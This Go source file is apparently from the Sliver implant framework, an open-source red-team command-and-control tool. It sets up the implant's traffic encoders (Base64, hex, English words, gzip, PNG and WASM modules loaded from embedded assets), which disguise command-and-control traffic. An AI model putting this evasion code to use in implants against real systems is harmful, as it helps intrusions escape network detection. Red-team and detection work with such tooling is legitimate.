package encoders

/*
	Sliver Implant Framework
	Copyright (C) 2023  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"embed"
	"errors"
	insecureRand "math/rand"
	"strings"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	// {{if .Config.TrafficEncoders.Enabled}}
	"github.com/bishopfox/sliver/implant/sliver/encoders/traffic"
	// {{end}}
)

func init() {
	err := loadWasmEncodersFromAssets()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to load WASM encoders: %v", err)
		// {{end}}
		return
	}
	err = loadEnglishDictionaryFromAssets()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to load english dictionary: %v", err)
		// {{end}}
		return
	}
}

var (
	//go:embed assets/*
	assetsFS embed.FS // files will be gzip'd

	Base64  = Base64Encoder{}
	Hex     = HexEncoder{}
	English = EnglishEncoder{}
	Gzip    = GzipEncoder{}
	PNG     = PNGEncoder{}

	// {{if .Config.Debug}}
	Nop = NoEncoder{}
	// {{end}}
)

// EncoderMap - Maps EncoderIDs to Encoders
var EncoderMap = map[int]Encoder{
	Base64EncoderID:  Base64,
	HexEncoderID:     Hex,
	EnglishEncoderID: English,
	GzipEncoderID:    Gzip,
	PNGEncoderID:     PNG,

	// {{if .Config.Debug}}
	0: NoEncoder{},
	// {{end}}
}

// EncoderMap - Maps EncoderIDs to Encoders
var NativeEncoderMap = map[int]Encoder{
	Base64EncoderID:  Base64,
	HexEncoderID:     Hex,
	EnglishEncoderID: English,
	GzipEncoderID:    Gzip,
	PNGEncoderID:     PNG,

	// {{if .Config.Debug}}
	0: NoEncoder{},
	// {{end}}
}

// Encoder - Can losslessly encode arbitrary binary data
type Encoder interface {
	Encode([]byte) ([]byte, error)
	Decode([]byte) ([]byte, error)
}

// EncoderFromNonce - Convert a nonce into an encoder
func EncoderFromNonce(nonce int) (int, Encoder, error) {
	encoderID := nonce % EncoderModulus
	if encoderID == 0 {
		return 0, new(NoEncoder), nil
	}
	if encoder, ok := EncoderMap[encoderID]; ok {
		return encoderID, encoder, nil
	}
	return -1, nil, errors.New("invalid encoder nonce")
}

// RandomEncoder - Get a random nonce identifier and a matching encoder
func RandomEncoder() (int, Encoder) {
	keys := make([]int, 0, len(EncoderMap))
	for k := range EncoderMap {
		keys = append(keys, k)
	}
	encoderID := keys[insecureRand.Intn(len(keys))]
	nonce := (insecureRand.Intn(MaxN) * EncoderModulus) + encoderID
	return nonce, EncoderMap[encoderID]
}

func loadWasmEncodersFromAssets() error {

	// *** {{if .Config.TrafficEncoders.Enabled}} ***

	// {{if .Config.Debug}}}
	log.Printf("initializing traffic encoder map...")
	// {{end}}

	assetFiles, err := assetsFS.ReadDir(".")
	if err != nil {
		return err
	}
	for _, assetFile := range assetFiles {
		if assetFile.IsDir() {
			continue
		}
		if !strings.HasSuffix(assetFile.Name(), ".wasm") {
			continue
		}
		// WASM Module name should be equal to file name without the extension
		wasmEncoderModuleName := strings.TrimSuffix(assetFile.Name(), ".wasm")
		wasmEncoderData, err := assetsFS.ReadFile(assetFile.Name())
		if err != nil {
			return err
		}
		wasmEncoderData, err = Gzip.Decode(wasmEncoderData)
		if err != nil {
			return err
		}
		wasmEncoderID := traffic.CalculateWasmEncoderID(wasmEncoderData)
		trafficEncoder, err := traffic.CreateTrafficEncoder(wasmEncoderModuleName, wasmEncoderData, func(msg string) {
			// {{if .Config.Debug}}
			log.Printf("[Traffic Encoder] %s", msg)
			// {{end}}
		})
		if err != nil {
			return err
		}
		EncoderMap[int(wasmEncoderID)] = trafficEncoder
		// {{if .Config.Debug}}
		log.Printf("Loading %s (id: %d, bytes: %d)", wasmEncoderModuleName, wasmEncoderID, len(wasmEncoderData))
		// {{end}}
	}
	// {{if .Config.Debug}}
	log.Printf("Loaded %d traffic encoders", len(assetFiles))
	//	{{end}}

	// *** {{end}} ***
	return nil
}

func loadEnglishDictionaryFromAssets() error {
	englishData, err := assetsFS.ReadFile("english.txt")
	if err != nil {
		return err
	}
	englishData, err = Gzip.Decode(englishData)
	if err != nil {
		return err
	}
	for _, word := range strings.Split(string(englishData), "\n") {
		rawEnglishDictionary = append(rawEnglishDictionary, strings.TrimSpace(word))
	}
	return nil
}
